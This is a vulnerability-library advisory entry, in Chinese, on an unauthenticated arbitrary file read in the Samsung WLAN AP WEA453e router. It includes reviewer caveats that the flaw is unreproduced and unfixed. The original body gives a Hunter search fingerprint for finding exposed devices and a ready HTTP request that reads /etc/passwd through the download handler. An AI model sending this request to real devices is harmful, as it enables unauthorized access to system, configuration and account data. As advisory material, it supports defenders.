---
source: "wy876 漏洞文库"
id: "vw-e689817134dde2c98038c66c"
entity_id: "ve-e689817134dde2c98038c66c"
schema_version: "1"
fofa_unverified: "web.title="
title: "三星路由器WLAN AP任意文件读取漏洞"
product: "Samsung WLAN AP WEA453e"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "声称无认证，版本不明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E4%B8%89%E6%98%9F%E8%B7%AF%E7%94%B1%E5%99%A8/%E4%B8%89%E6%98%9F%E8%B7%AF%E7%94%B1%E5%99%A8WLANAP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ypkfb8s12ng42izh"
source_status: "recorded"
---

# 三星路由器WLAN AP任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Samsung WLAN AP WEA453e
- 本文讨论：download处理器任意文件读
- 版本、权限与配置前提：声称无认证，版本不明
- 资料类型：文件读取请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅passwd请求無响应，任意范围未证明；fofa实际Hunter残缺字段
- 缺修复/原始披露
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 与RCE相同处理器是否同修复点、范围待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
三星 WLAN AP WEA453e路由器存在任意文件读取漏洞，可在未授权的情况下获取敏感信息。

# 二、影响版本
+ 三星 WLAN AP WEA453e路由器

# 三、资产测绘
+ hunter`web.title="Samsung WLAN AP"`
+ 特征


# 四、漏洞复现
```http
GET /(download)/etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ypkfb8s12ng42izh>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
